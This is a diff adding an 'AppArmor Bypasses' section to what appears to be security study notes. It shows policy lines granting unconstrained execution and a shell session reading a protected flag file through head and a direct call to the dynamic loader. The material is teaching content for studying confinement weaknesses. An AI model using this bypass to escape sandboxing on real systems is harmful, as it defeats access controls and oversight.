@@ -60,3 +60,32 @@ $ docker run -it --rm --security-opt "apparmor=docker_apparmor" apparmor-dummy
 
 And the flag should be neither readable nor modifiable.
 </div></div>
+
+<hr class="sep-both">
+
+## AppArmor Bypasses
+
+<div class="row row-cols-lg-2"><div>
+
+#### Unconstrained Mode
+
+Some configurations may allow executables or libraries to be loaded in unconstrained mode: the policy is not applied on them.
+
+```bash!
+/usr/bin/head ux,
+/lib/x86_64-linux-gnu/ld-*.so mrux,
+...
+```
+
+You need to find a way to exploit them:
+
+```shell!
+root# cat flag.txt 
+cat: flag.txt: Permission denied
+root# head flag.txt 
+flag{you_found_me}
+root# /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 cat flag.txt
+flag{you_found_me}
+```
+</div><div>
+</div></div>
